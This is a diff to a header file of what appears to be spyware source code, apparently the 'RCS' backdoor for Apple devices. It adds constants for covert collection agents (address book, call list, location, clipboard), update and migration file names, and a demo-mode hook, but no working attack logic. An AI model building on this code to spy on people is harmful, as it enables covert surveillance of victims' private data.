@@ -74,6 +74,8 @@ typedef struct kinfo_proc kinfo_proc;
 #define SH_LOG_FILENAME     @"78shfu"
 
 #define SSL_FIRST_COMMAND @".NEWPROTO"
+#define RCS8_MIGRATION_CONFIG @"nc-7-8dv.cfg"
+#define RCS8_UPDATE_DYLIB     @"od-8-8dv.dlb"
 
 // unixEpoch - winEpoch stuff
 #define EPOCH_DIFF 0x019DB1DED53E8000LL /* 116444736000000000 nsecs */
@@ -108,7 +110,7 @@ typedef struct kinfo_proc kinfo_proc;
 // Agents
 //
 #define AGENT_MESSAGES    0x1001
-#define AGENT_ORGANIZER   0x1002
+#define AGENT_ORGANIZER   0x1002 // per rcs 8.0: agent addressbook
 #define AGENT_CALL_LIST   0x1003
 #define AGENT_DEVICE      0x1004
 #define AGENT_POSITION    0x1005
@@ -123,6 +125,7 @@ typedef struct kinfo_proc kinfo_proc;
 #define AGENT_CLIPBOARD   0x100F
 #define AGENT_CRISIS      0x1010
 #define AGENT_APPLICATION 0x1011
+#define AGENT_ADDRESSBOOK 0x1012 // per rcs 8.0
 
 //
 // Agents Shared Memory offsets
@@ -139,6 +142,7 @@ typedef struct kinfo_proc kinfo_proc;
 #define OFFT_UNINSTALL    0x2440
 #define OFFT_APPLICATION  0x2840
 #define OFFT_STANDBY      0x2C40
+#define OFFT_SIMCHG       0x3040
 
 extern u_int remoteAgents[];
 
@@ -157,6 +161,9 @@ extern u_int remoteAgents[];
 #define EVENT_AC          0x200A
 #define EVENT_BATTERY     0x200B
 #define EVENT_STANDBY     0x200C
+#define EVENT_NULL        0xFFFF
+// internal events
+#define EVENT_CAMERA_APP  0xB000
 
 // NEW - TODO
 //#define EVENT_LOCKSCREEN  (uint)0x000x
@@ -174,6 +181,8 @@ extern u_int remoteAgents[];
 #define ACTION_SYNC_PDA     0x0008
 #define ACTION_SYNC_APN     0x400a
 #define ACTION_INFO         0x400b
+#define ACTION_COMMAND      0x400c
+#define ACTION_EVENT        0x400d
 
 // Configuration file Tags
 #define EVENT_CONF_DELIMITER  "EVENTCONFS-"
@@ -441,6 +450,7 @@ extern char     gInstanceId[];
 extern char     gBackdoorID[];
 extern char     gBackdoorSignature[];
 extern char     gConfName[];
+extern char     gDemoMarker[];
 extern u_int    gVersion;
 extern FILE     *logFD;
 extern NSString *gDylibName;
@@ -452,6 +462,7 @@ extern BOOL     gAgentCrisis;
 extern NSData   *gSessionKey;
 extern BOOL     gCameraActive;
 extern int      gLockSock;
+extern BOOL     gIsDemoMode;
 
 // OS version
 extern u_int gOSMajor;
@@ -518,5 +529,11 @@ void getSystemVersion(u_int *major,
 
 NSMutableArray *
 rcs_sqlite_do_select(sqlite3 *db, const char *stmt);
+
+#ifdef __cplusplus
+  extern "C" {void checkAndRunDemoMode(void);}
+#else
+  void checkAndRunDemoMode(void);
+#endif
 
 //#endif
